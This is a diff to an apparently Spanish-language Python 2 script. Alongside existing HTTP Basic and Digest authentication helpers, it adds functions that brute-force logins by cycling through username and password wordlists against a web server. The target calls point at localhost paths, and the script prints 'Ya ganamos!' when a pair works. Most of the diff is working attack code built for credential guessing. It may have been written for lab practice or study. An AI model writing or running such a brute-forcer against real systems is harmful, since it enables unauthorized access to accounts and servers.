@@ -1,4 +1,5 @@
 #!/usr/bin/python
+# -*- coding: utf-8 -*-
 from urlparse import urlparse
 import requests, ssl, httplib, base64, urllib, hashlib, time, os
 ##################################################################
@@ -193,6 +194,35 @@ def build_digest_header(realm, nonce, qop, algorithm, opaque, username, password
 
         return 'Digest %s' % (base)
     
-#authBasic("localhost",443,"admin","pops",True)
-print authDigest("http://localhost/perl/",80,"admin","admin",False)
+
+# @param auth = 1 -> Basic, 2 -> Digest
+# @param protocolo = True -> https , False -> http
+def passAttack(username,auth, protocolo, url, port,dic):
+    f = open(dic, 'r')
+    for line in f:
+	password = line[:-1]
+        res = False
+        if auth == 1 :
+            res = authBasic(url, port, username, password,protocolo)
+        else :
+            res = authDigest(url, port, username, password,protocolo)
+            
+        if res :
+            print "Ya ganamos!"
+            return True
+    return False
+
+# @param auth = 1 -> Basic, 2 -> Digest
+# @param protocolo = True -> https , False -> http
+def Attack(auth, protocolo, url, port,dicP, dicU):
+    f = open(dicU, 'r')
+    for line in f:
+	user = line[:-1]
+        if passAttack(user,auth, protocolo, url, port,dicP) :
+            return
+            
+Attack(1,False,"http://localhost/tienda/",80,"phpbb.txt.min","uhpbb.txt.min")            
+Attack(2,False,"http://localhost/perl/",80,"phpbb.txt.min","uhpbb.txt.min")            
+    
+#print authDigest("http://localhost/perl/",80,"admin","admin",False)
 
